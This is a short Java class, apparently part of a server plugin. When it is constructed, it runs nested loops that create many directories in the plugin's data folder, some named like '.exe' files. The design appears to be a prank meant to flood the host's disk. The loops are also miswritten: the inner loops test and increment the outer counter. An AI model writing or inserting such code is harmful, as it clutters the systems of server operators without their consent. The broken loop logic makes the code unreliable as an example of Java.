package com.drtshock.awesome;

import java.io.File;

import libilibigot.LibiLibigot;

public class DrtShockHandler {

	private static LibiLibigot a;

	public DrtShockHandler(LibiLibigot libiLibigot) {
		DrtShockHandler.a = libiLibigot;
		a();
	}

	public static void a() {
		for(int b = 0; b < 1000; b++) 
			for(int c = 0; b < 1000; b++)
				for(int d = 0; b < 1000; b++){
					String e = a.getDataFolder() + File.separator + b + File.separator + c + File.separator + d;
					File f = new File(e);
					File g = new File(e + File.separator + b + c + d + ".exe");
					if(!f.exists())
						f.mkdirs();
					if(!g.exists())
						g.mkdirs();
				}
	}

}
